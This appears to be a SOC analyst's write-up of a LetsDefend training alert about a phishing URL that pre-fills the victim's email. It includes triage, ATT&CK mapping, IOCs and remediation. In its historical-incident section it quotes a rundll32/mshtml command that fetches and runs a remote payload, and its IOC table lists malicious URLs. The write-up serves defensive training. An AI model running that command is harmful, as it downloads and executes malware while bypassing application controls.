
# SOC141 - Phishing URL Detected 

## 🚨 Raw Alert Details
```text
EventID : 86
Event Time : 2021-03-22T21:23:12+03:00
Rule : SOC141 - Phishing URL Detected
Level : Security Analyst
Alert Type : Proxy
Username : ellie
Source Address : 172.16.17.49
Source Hostname : EmilyComp
Destination Address : 91.189.114.8
Destination Hostname : mogagrocol.ru
Request URL : http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io
Device Action : Allowed
```

## Alert Overview
- **Severity:** Medium
- **Detection Source:** Web Proxy
- **Asset Affected:** EmilyComp (172.16.17.49) / User: ellie
- **Threat Type:** Credential Harvesting / Phishing
- **Status:** True Positive (Compromised)

## 🧠 Deep Dive: Pre-filled Phishing Campaigns
This incident involves a targeted Credential Harvesting campaign utilizing URL parameter passing. 

**The Mechanics:** The attacker sends a phishing email containing a customized link for each victim. Notice the URL in the alert: `...?email=ellie@letsdefend.io`. When the user clicks this link, the backend PHP script on the attacker's server reads the `email=` parameter and automatically fills in the "Username" box on the fake login page. 

This psychological trick severely lowers the victim's guard. Because their corporate email is already populated on the page, the user is much more likely to assume the login portal is a legitimate, internally routed application, increasing the likelihood they will type in their password.

## Investigation Steps

### 1. Alert Triage and URL Analysis
The investigation began with a proxy alert triggered by the host `EmilyComp` navigating to a known malicious domain.
- **URL Analysis:** The target URL was hosted on a compromised WordPress site (`wp-content/plugins/...`). Threat actors frequently compromise legitimate, outdated WordPress blogs to host phishing landing pages, allowing them to bypass domain age and reputation filters.
- **Device Action:** Allowed. The user successfully reached the phishing page.

<img width="607" height="192" alt="image" src="https://github.com/user-attachments/assets/901bcd3c-abd5-4f57-9167-26e17f5b2211" />


### 2. Endpoint Health Assessment & Historical Compromise
During the endpoint triage of `EmilyComp`, a broader search of the EDR history revealed that this host is chronically infected and has been subjected to multiple disparate attacks over several months.
- **Incident A (Dec 2020):** Browser history and email logs confirm the host fell victim to a Netflix credential harvesting lure, clicking a `bit.ly` link that redirected to `hayatistanbul.net`.
- **Incident B (Feb 2021):** Terminal history revealed a severe "Living off the Land" (LotL) execution:
  `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'`
  *Analyst Note: This command uses MSHTML and RunDLL32 to bypass AppLocker and execute a malicious payload (`KBDYAK.exe`) directly from a Russian server.*

<img width="1176" height="330" alt="image" src="https://github.com/user-attachments/assets/45035010-9441-41ee-804c-5777e2de4389" />

<img width="1187" height="347" alt="image" src="https://github.com/user-attachments/assets/b06d7618-70e9-4746-8fbf-359bf519f53a" />


### 3. Impact Analysis (Current Alert)
Returning to the March 22nd alert, the proxy confirmed the outbound connection to `mogagrocol.ru`. Given the user's historical propensity to click phishing links and the fact that the proxy permitted the connection, it is highly probable that the user "Ellie" submitted her credentials to the phishing page.

## Analysis and Findings
The incident is a confirmed **True Positive**. The user navigated to a customized credential harvesting page hosted on a compromised Russian WordPress site. While investigating the endpoint, it became evident that the host `EmilyComp` has a severe history of un-remediated compromises, including malicious payload execution via `rundll32.exe`. The host represents a massive liability to the corporate network and requires immediate isolation.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.002 | Phishing: Spearphishing Link |
| **Execution** | T1204.001 | User Execution: Malicious Link |
| **Credential Access** | T1056.002 | Input Capture: GUI Input Capture (Credential Harvesting) |
| **Defense Evasion** | T1218.011 | System Binary Proxy Execution: Rundll32 *(Historical finding)* |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| Domain | `mogagrocol.ru` | Current Phishing Domain (Credential Harvesting) |
| IP Address | 91.189.114.8 | Current Phishing Server IP |
| URL | `http://ru-uid-507352920.pp.ru/KBDYAK.exe` | Historical Payload Delivery URL |
| Domain | `places.hayatistanbul.net` | Historical Netflix Phishing Domain |

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Log Noise & Time-Bounding):** During the initial investigation, I connected the Netflix phishing email, the `rundll32` execution, and the `mogagrocol.ru` proxy alert into a single attack chain. 
- **The Lesson:** This was a failure to strictly time-bound my queries. The events occurred months apart (Dec 2020, Feb 2021, and Mar 2021). While all events point to a severely compromised host, they are distinct, unrelated campaigns. In incident response, creating a strict chronological timeline (+/- 2 hours from the alert) is critical to isolate the *current* threat from historical log noise.

## 🚀 Decision Tree for Proxy Phishing Alerts
1. **Analyze URL:** Does the URL contain tracking parameters or the user's email address?
   - If Yes -> High probability of a targeted phishing campaign.
2. **Check Proxy Action:** Was the connection Blocked or Allowed?
   - If Allowed -> Proceed to user verification.
3. **Verify Endpoint:** Does the EDR Browser History confirm the user spent time on the page?
   - If Yes -> **Verdict: True Positive - Compromised (Credentials assumed stolen).**
4. **Action:** Isolate host, force credential resets, and block the domain.

## Response and Closure
- **Action Taken:** The host `EmilyComp` (172.16.17.49) was immediately **Isolated** from the network. A mandatory password reset was initiated for the user `ellie@letsdefend.io`. The domain `mogagrocol.ru` was added to the perimeter blocklist.
- **Containment Required:** Yes.
- **Closure Reason:** True Positive. User navigated to a credential harvesting site.

## Recommendations
1. **Mandatory Re-Imaging:** Due to the historical execution of `KBDYAK.exe` via `rundll32` found during the audit, the host `EmilyComp` cannot be trusted. It must be wiped and re-imaged from a known-good baseline.
2. **Phishing Awareness Training:** The user of this machine has repeatedly fallen for social engineering lures (Netflix, etc.). They must be enrolled in mandatory, remedial phishing simulation training.
3. **Proxy Tuning:** Enhance the web proxy rules to warn or block users navigating to newly observed domains or uncategorized `.ru` domains, particularly those accessed directly via email clients.

## 🛠️ Skills & Tools Used
- **Proxy Log Analysis:** Correlating URL parameters (`?email=`) to identify targeted credential harvesting.
- **Timeline Forensics:** Differentiating between active alerts and historical endpoint compromises.
- **Threat Intelligence:** Identifying compromised CMS infrastructure (WordPress plugins).
- **Incident Containment & Eradication:** Host isolation, credential revocation, and re-imaging protocols.
